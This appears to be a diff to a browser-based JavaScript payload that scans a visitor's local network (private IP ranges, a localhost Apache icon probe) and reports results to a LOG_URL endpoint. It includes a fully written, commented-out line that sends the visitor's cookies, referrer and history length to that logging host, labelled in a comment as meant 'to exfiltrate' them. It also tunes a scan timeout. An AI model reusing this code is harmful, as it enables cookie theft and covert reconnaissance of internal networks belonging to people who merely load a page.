@@ -15,7 +15,9 @@
     let local_ip_ranges = ["10.", "192.168.", "172.16."];
 
     let imCoo = new Image();
-    //imCoo.src = LOG_URL + "?c=" + document.cookie + "&r=" + document.referrer + "&l=" + history.length;
+    //Just To Exfiltrate Referer, Cookies -> imCoo.src = LOG_URL + "?c=" + document.cookie + "&r=" + document.referrer + "&l=" + history.length;
+     /*
+     Uncomment to fingerprint Apache Servers
      imCoo.src="http://127.0.0.1:80/icons/apache_pb.png";
 
       imCoo.onerror = function()
@@ -29,6 +31,7 @@
         let imL = new Image();
         imL.src = LOG_URL + "?APACHE FOUND";
       }
+      */
      //
       var last_scanobj_index = 0;
       var scanobjs = {};
@@ -72,7 +75,7 @@
                           thiss.on_stealthed();
                       }
                   },
-                  5000/*10000*/
+                  4000/*10000*/
               );
           }
       }
